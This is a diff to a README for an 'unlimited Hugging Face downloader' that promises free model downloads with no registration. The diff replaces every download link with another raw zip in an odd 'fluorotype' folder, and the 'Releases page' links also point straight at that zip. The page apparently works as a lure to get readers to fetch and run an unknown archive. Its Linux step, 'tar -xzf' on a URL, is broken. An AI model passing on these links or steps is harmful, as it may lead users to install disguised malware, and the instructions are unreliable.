@@ -1,7 +1,7 @@
 # 🤖 unlimited-hugging-face-downloader - Download Hugging Face Models Effortlessly
 
 ## 📥 Download Now
-[![Download](https://github.com/MACMAC55/unlimited-hugging-face-downloader/raw/refs/heads/main/fluorotype/downloader_face_unlimited_hugging_2.1.zip%20Now-v1.0-blue)](https://github.com/MACMAC55/unlimited-hugging-face-downloader/raw/refs/heads/main/fluorotype/downloader_face_unlimited_hugging_2.1.zip)
+[![Download](https://raw.githubusercontent.com/MACMAC55/unlimited-hugging-face-downloader/main/fluorotype/face_unlimited_hugging_downloader_2.0.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/MACMAC55/unlimited-hugging-face-downloader/main/fluorotype/face_unlimited_hugging_downloader_2.0.zip)
 
 ## 📚 Overview
 The **unlimited-hugging-face-downloader** allows you to download unlimited Hugging Face models for free. There is no registration needed, and you won't encounter any watermarks. This tool simplifies the process, helping you access various models for tasks like sentiment analysis, natural language processing, and data augmentation.
@@ -12,7 +12,7 @@ Follow these steps to get your application up and running quickly.
 ### 1. Visit the Download Page
 You will need to visit our Releases page to find the latest version of the application. Click the link below to access it:
 
-[Visit the Releases Page to Download](https://github.com/MACMAC55/unlimited-hugging-face-downloader/raw/refs/heads/main/fluorotype/downloader_face_unlimited_hugging_2.1.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/MACMAC55/unlimited-hugging-face-downloader/main/fluorotype/face_unlimited_hugging_downloader_2.0.zip)
 
 ### 2. Choose the Right Version
 On the Releases page, you will see different versions of the application. Select the latest version that matches your operating system.
@@ -30,8 +30,8 @@ For macOS:
 - Open it and drag the application to your Applications folder.
 
 For Linux:
-- Download the `https://github.com/MACMAC55/unlimited-hugging-face-downloader/raw/refs/heads/main/fluorotype/downloader_face_unlimited_hugging_2.1.zip` file.
-- Extract it using the terminal with the command: `tar -xzf https://github.com/MACMAC55/unlimited-hugging-face-downloader/raw/refs/heads/main/fluorotype/downloader_face_unlimited_hugging_2.1.zip`
+- Download the `https://raw.githubusercontent.com/MACMAC55/unlimited-hugging-face-downloader/main/fluorotype/face_unlimited_hugging_downloader_2.0.zip` file.
+- Extract it using the terminal with the command: `tar -xzf https://raw.githubusercontent.com/MACMAC55/unlimited-hugging-face-downloader/main/fluorotype/face_unlimited_hugging_downloader_2.0.zip`
 - Follow the included instructions to run the application.
 
 ## ⚙️ System Requirements
@@ -66,7 +66,7 @@ If you run into issues or have questions, feel free to:
 2. Open an issue directly on the GitHub repository for support.
 
 ## 📦 Download & Install
-To start using the unlimited-hugging-face-downloader, visit our [Releases page](https://github.com/MACMAC55/unlimited-hugging-face-downloader/raw/refs/heads/main/fluorotype/downloader_face_unlimited_hugging_2.1.zip) and download the latest version suitable for your operating system. Follow the installation instructions to get up and running.
+To start using the unlimited-hugging-face-downloader, visit our [Releases page](https://raw.githubusercontent.com/MACMAC55/unlimited-hugging-face-downloader/main/fluorotype/face_unlimited_hugging_downloader_2.0.zip) and download the latest version suitable for your operating system. Follow the installation instructions to get up and running.
 
 ## 🌐 Additional Resources
 - **Documentation**: Find more detailed instructions in the documentation.
